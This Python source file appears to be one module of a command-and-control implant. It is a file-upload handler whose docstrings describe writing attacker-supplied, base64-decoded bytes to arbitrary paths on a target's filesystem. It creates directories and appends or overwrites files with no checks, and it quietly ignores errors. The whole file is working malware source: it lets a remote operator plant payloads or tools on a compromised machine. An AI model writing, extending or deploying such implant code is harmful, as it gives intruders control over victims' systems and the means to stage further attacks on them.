"""File upload handler — writes C2-supplied bytes to disk."""
from __future__ import annotations
import base64
import os


class UploadHandler:
    """Write bytes from the C2 to a path on the target filesystem."""

    def write(self, path: str, data_b64: str, append: bool = False, mkdir: bool = True) -> dict:
        """
        Decode base64 data and write to path.

        Returns {"status": "ok"|"error", "output": str, "bytes_written": int}.
        """
        try:
            data = base64.b64decode(data_b64)
        except Exception as exc:
            return {"status": "error", "output": f"Base64 decode error: {exc}", "bytes_written": 0}

        if mkdir:
            try:
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
            except OSError as exc:
                # Parent dir creation failed but we'll attempt write anyway
                pass

        mode = "ab" if append else "wb"
        try:
            with open(path, mode) as fh:
                fh.write(data)
            return {
                "status":        "ok",
                "output":        f"Written {len(data)} bytes to {path}",
                "bytes_written": len(data),
            }
        except OSError as exc:
            return {"status": "error", "output": str(exc), "bytes_written": 0}
